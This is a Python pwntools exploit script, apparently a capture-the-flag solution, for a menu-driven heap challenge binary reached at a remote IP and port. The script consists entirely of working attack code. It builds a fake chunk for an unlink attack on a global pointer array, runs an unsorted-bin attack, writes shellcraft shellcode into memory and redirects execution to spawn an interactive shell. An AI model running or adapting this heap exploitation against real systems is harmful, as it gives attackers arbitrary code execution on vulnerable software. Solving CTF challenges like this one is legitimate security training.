# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64')
#context(log_level='debug')

#p = process("./timu")
p = remote("111.198.29.45", 58939)

elf = ELF("./timu")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size, data):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Data: ")
    p.sendline(data)

def delete(index):
    p.recvuntil("Your choice :")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def update(index,size,data):
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Data: ")
    p.sendline(data)

#gdb.attach(p)

ptr = 0x601040
payload = p64(0)+p64(0x21)+p64(ptr-0x18)+p64(ptr-0x10)+p64(0x20)
create(0x50,payload)
create(0x8,"a")
create(0x80,"b")
payload = 2*p64(0) + p64(0x70) + p64(0x90)
update(1, len(payload), payload)
delete(2)
payload = p64(0)*3 + p64(ptr+0x20)+p64(0x601070)+p64(0)*2
update(0, len(payload), payload)

create(0x20,"aaaa")#2
create(0x80,"aaaa")#3
create(0x20,"aaaa")#4
delete(3)
magic = 0x601060
fd = 0
bk = magic - 0x10
payload = "a" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk)
update(2,len(payload),payload)
create(0x80,"dada")
update(0,1,"\x10")
payload = asm(shellcraft.sh())+"\x00"*5
update(1,len(payload),payload)
update(4,8,p64(0x601070))
#create(4,"win")
p.sendline("1")
p.sendline("10")
p.interactive()
